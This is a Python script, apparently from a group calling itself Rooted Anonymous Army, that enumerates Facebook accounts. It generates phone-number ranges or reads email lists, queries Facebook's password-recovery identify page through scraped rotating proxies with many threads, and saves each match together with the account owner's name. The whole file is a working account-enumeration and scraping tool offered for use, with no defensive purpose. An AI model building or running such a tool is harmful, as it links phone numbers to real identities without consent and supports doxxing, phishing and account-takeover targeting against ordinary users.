import requests
import time
import os
import random
import sys
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Color Codes for Hacker Interface
G = '\033[32m' # Green
R = '\033[31m' # Red
Y = '\033[33m' # Yellow
C = '\033[36m' # Cyan
W = '\033[0m'  # White

# --- Configuration & Security ---
VERSION = "1.0"
# Replace 'YourUsername' with your actual GitHub username once uploaded
UPDATE_URL = "https://raw.githubusercontent.com/YourUsername/FB-Discovery-Tool-RAA/main/version.txt"
PASSWORD = "RAA-786" # Your Tool Access Token

def check_update():
    print(f"{Y}[*] Checking for system updates...{W}")
    try:
        response = requests.get(UPDATE_URL, timeout=5)
        if response.status_code == 200:
            if response.text.strip() != VERSION:
                print(f"{G}[!] New version detected! Downloading updates...{W}")
                os.system("git pull")
                print(f"{G}[✔] Update successful! Restarting tool...{W}")
                time.sleep(2)
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                print(f"{G}[✔] System is up to date.{W}")
        else:
            print(f"{R}[!] Could not connect to update server.{W}")
    except:
        print(f"{Y}[!] Offline mode: Skipping update check.{W}")

def login():
    os.system('clear')
    print(f"{C}================================================{W}")
    print(f"{G}       RAA SECURE ACCESS TERMINAL{W}")
    print(f"{C}================================================{W}")
    token = input(f"{Y}[?] Enter Access Token: {W}")
    if token == PASSWORD:
        print(f"{G}[✔] Access Granted! Welcome back.{W}")
        time.sleep(1)
    else:
        print(f"{R}[X] Unauthorized Access! System Locked.{W}")
        print(f"{Y}[!] Contact Sabid Sarker or Ashish Shom for access.{W}")
        sys.exit()

def banner():
    os.system('clear')
    print(f"""
{R}    ____  ___    ___     ____  ____  ___ 
   / __ \/   |  /   |   / __ \/ __ \/   |
  / /_/ / /| | / /| |  / /_/ / /_/ / /| |
 / _, _/ ___ |/ ___ | / _, _/ _, _/ ___ |
/_/ |_/_/  |_/_/  |_|/_/ |_/_/ |_/_/  |_|
                                         
{C}================================================
{G} [+] TOOL     : {W}FB-Discovery-Tool RAA {Y}[v{VERSION}]
{G} [+] TEAM     : {R}Rooted Anonymous Army (RAA)
{G} [+] FOUNDER  : {W}Sabid Sarker
{G} [+] CEO      : {W}Ashish Shom
{C}================================================
{Y}        STATUS: {G}RAA SERVER CONNECTED [✔]
{C}================================================
{W}    [1] Phone Number Scanner (Turbo)
    [2] Email List Scanner (Turbo)
    [3] Update Proxy Database
    [0] Terminate Session
{C}================================================{W}
    """)

def scrape_proxies():
    print(f"{Y}[*] Scraping fresh proxy nodes...{W}")
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url)
        proxies = res.text.split('\r\n')
        with open("proxies.txt", "w") as f:
            for p in proxies:
                if p: f.write(p + "\n")
        print(f"{G}[✔] Proxy database updated: {len(proxies)} nodes saved.{W}")
    except:
        print(f"{R}[!] Failed to update proxy database.{W}")

def get_name(target, proxy=None):
    url = f"https://m.facebook.com/login/identify/?ctx=recover&email={target}"
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10)"}
    try:
        p_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        res = requests.get(url, headers=headers, proxies=p_dict, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        name_tag = soup.find("strong")
        return name_tag.text if name_tag else "Private/Hidden"
    except:
        return "Unknown"

def process_target(target, proxy_list):
    proxy = random.choice(proxy_list) if proxy_list else None
    url = f"https://www.facebook.com/login/identify/?ctx=recover&email={target}"
    try:
        p_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        res = requests.get(url, proxies=p_dict, timeout=7)
        if "did_submit=1" not in res.url:
            name = get_name(target, proxy)
            print(f"{G}[✔] HIT: {target} | Name: {name}{W}")
            with open("RAA_results.txt", "a", encoding="utf-8") as f:
                f.write(f"ID: {target} | Name: {name}\n")
        else:
            print(f"{R}[X] NO HIT: {target}{W}")
    except:
        pass

def main():
    check_update()
    login()
    while True:
        banner()
        choice = input(f"{Y}[RAA-Terminal@User]:~# {W}")
        
        proxies = []
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]

        if choice == '1':
            prefix = input(f"{C}[+] Target Prefix (e.g. 01711): {W}")
            start = int(input(f"{C}[+] Start Range (6 digits): {W}"))
            end = int(input(f"{C}[+] End Range (6 digits): {W}"))
            threads = int(input(f"{C}[+] Speed/Threads (1-10): {W}"))
            
            targets = [f"{prefix}{str(i).zfill(6)}" for i in range(start, end + 1)]
            print(f"\n{Y}[*] RAA Turbo Mode Activated...{W}\n")
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(lambda t: process_target(t, proxies), targets)
            input(f"\n{G}Scan Finished. Results in RAA_results.txt. Press Enter.{W}")

        elif choice == '2':
            file_name = input(f"{C}[+] Email List File: {W}")
            threads = int(input(f"{C}[+] Speed/Threads: {W}"))
            try:
                with open(file_name, "r") as f:
                    targets = [line.strip() for line in f if line.strip()]
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    executor.map(lambda t: process_target(t, proxies), targets)
            except: print(f"{R}Error: File Not Found!{W}")
            input(f"\n{G}Scan Finished. Press Enter.{W}")

        elif choice == '3':
            scrape_proxies(); time.sleep(2)

        elif choice == '0':
            print(f"{R}Logging out... Goodbye!{W}"); break

if __name__ == "__main__":
    main()
